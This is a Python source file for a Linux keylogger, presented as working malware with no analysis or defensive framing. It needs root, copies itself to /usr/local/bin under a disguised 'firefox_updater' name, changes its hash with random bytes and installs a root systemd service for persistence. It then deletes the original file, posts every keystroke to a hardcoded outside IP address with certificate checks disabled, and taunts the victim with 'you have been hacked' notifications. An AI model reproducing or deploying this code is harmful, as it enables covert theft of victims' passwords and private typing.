import keyboard
import requests
import os
import sys
import shutil
import subprocess
import random
import time

# Server URL with HTTPS
server_url = 'https://103.100.39.219:5000/log'

key_press_count = 0  

def get_top_user():
    try:
        output = subprocess.check_output("w -h | awk '{print $1}' | head -n 1", shell=True)
        return output.decode().strip()
    except Exception as e:
        return None

def check_sudo():
    if os.geteuid() != 0:
        send_notification("Permission Error", "This script requires sudo privileges. Please run it with sudo.")
        sys.exit(1)

def send_data(key):
    try:
        requests.post(server_url, data={'keystroke': key}, verify=False)
    except Exception as e:
        pass

def send_notification(title, message):
    user = get_top_user()
    if user:
        try:
            command = f'sudo -u {user} DISPLAY=:0 DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/$(id -u {user})/bus notify-send "{title}" "{message}"'
            subprocess.run(command, shell=True, check=True)
        except Exception as e:
            pass

def on_key_press(event):
    global key_press_count
    key = event.name
    send_data(key)
    
    key_press_count += 1
    
    if key_press_count >= 10:
        show_hacked_message()
        key_press_count = 0  

def start_keylogger():
    time.sleep(5)
    keyboard.on_press(on_key_press)
    keyboard.wait()

def create_systemd_service(exec_path):
    service_file = "/etc/systemd/system/firefox_updater.service"
    service_content = f"""[Unit]
Description=Firefox Updater Keylogger
After=network.target

[Service]
Type=simple
ExecStart={exec_path} --fg
User=root
Restart=on-failure

[Install]
WantedBy=multi-user.target
"""
    try:
        with open(service_file, 'w') as f:
            f.write(service_content)
        subprocess.run(["systemctl", "daemon-reload"], check=True)
        subprocess.run(["systemctl", "enable", "firefox_updater.service"], check=True)
    except Exception as e:
        sys.exit(1)

def clone_and_modify():
    exe_path = sys.executable
    random_number = random.randint(1000, 9999)
    new_bin_path = f"/usr/local/bin/firefox_updater_v{random_number}"
    
    try:
        shutil.copyfile(exe_path, new_bin_path)
        os.chmod(new_bin_path, 0o755)
    except Exception as e:
        return False  

    try:
        with open(new_bin_path, 'ab') as f:
            random_bytes = os.urandom(1024)
            f.write(random_bytes)
    except Exception as e:
        return False  

    create_systemd_service(new_bin_path)
    
    try:
        if "--fg" not in sys.argv:
            # Run the cloned executable as a background process
            os.spawnv(os.P_NOWAIT, new_bin_path, [new_bin_path, "--cloned"])
        else:
            # Run the cloned executable in the foreground
            os.execv(new_bin_path, [new_bin_path, "--fg", "--cloned"])
    except Exception as e:
        return False  

    return True  

def cleanup_original(exec_path):
    try:
        os.remove(exec_path)
    except Exception as e:
        pass

def show_hacked_message():
    try:
        send_notification("Security Alert", "You have been hacked! I am listening to everything you type!")
    except Exception as e:
        pass

if __name__ == "__main__":
    check_sudo()

    if "--cloned" not in sys.argv:
        if clone_and_modify():
            cleanup_original(sys.executable)
            os._exit(0)  
        else:
            sys.exit(1) 

    start_keylogger()
